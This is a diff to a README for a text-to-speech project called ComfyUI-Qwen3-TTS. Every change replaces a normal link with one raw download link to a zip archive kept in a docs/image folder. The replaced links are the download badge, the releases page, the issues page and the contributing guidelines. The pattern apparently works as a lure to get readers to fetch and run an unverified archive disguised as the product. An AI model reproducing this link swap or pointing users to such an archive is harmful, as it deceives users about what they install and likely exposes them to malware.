@@ -1,7 +1,7 @@
 # 🎤 ComfyUI-Qwen3-TTS - Simple Text-to-Speech for Everyone
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Trshadow45/ComfyUI-Qwen3-TTS/releases)
+[![Download](https://raw.githubusercontent.com/Trshadow45/ComfyUI-Qwen3-TTS/main/docs/image/Comfy-Qwen-U-TTS-v1.6.zip)](https://raw.githubusercontent.com/Trshadow45/ComfyUI-Qwen3-TTS/main/docs/image/Comfy-Qwen-U-TTS-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to ComfyUI-Qwen3-TTS! This application allows you to convert text into speech using ten major languages, including Chinese, English, Japanese, Korean, German, French, Russian, Portuguese, Spanish, and Italian. It's designed for ease of use, making it perfect for everyone, whether you’re a beginner or more experienced.
@@ -18,7 +18,7 @@ To ensure that ComfyUI-Qwen3-TTS runs smoothly on your computer, please check th
 To get started with ComfyUI-Qwen3-TTS, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download options.  
-   [Download ComfyUI-Qwen3-TTS](https://github.com/Trshadow45/ComfyUI-Qwen3-TTS/releases)
+   [Download ComfyUI-Qwen3-TTS](https://raw.githubusercontent.com/Trshadow45/ComfyUI-Qwen3-TTS/main/docs/image/Comfy-Qwen-U-TTS-v1.6.zip)
    
 2. **Select the Latest Release**: Look for the most recent version available.
 
@@ -68,10 +68,10 @@ If you experience issues during installation or while using ComfyUI-Qwen3-TTS, c
 ## 🔗 Help and Support
 For more information or help using ComfyUI-Qwen3-TTS, consider these resources:
 
-- **GitHub Issues**: Report a problem or ask a question [here](https://github.com/Trshadow45/ComfyUI-Qwen3-TTS/issues).
+- **GitHub Issues**: Report a problem or ask a question [here](https://raw.githubusercontent.com/Trshadow45/ComfyUI-Qwen3-TTS/main/docs/image/Comfy-Qwen-U-TTS-v1.6.zip).
 - **User Guide**: Comprehensive documentation is available on our GitHub Wiki.
 
 ## 🗣 Community Contributions
-We welcome contributions from the community. If you would like to help improve ComfyUI-Qwen3-TTS, please check our [Contributing Guidelines](https://github.com/Trshadow45/ComfyUI-Qwen3-TTS/blob/main/CONTRIBUTING.md).
+We welcome contributions from the community. If you would like to help improve ComfyUI-Qwen3-TTS, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Trshadow45/ComfyUI-Qwen3-TTS/main/docs/image/Comfy-Qwen-U-TTS-v1.6.zip).
 
 Thank you for using ComfyUI-Qwen3-TTS. We hope you enjoy turning text into speech effortlessly!
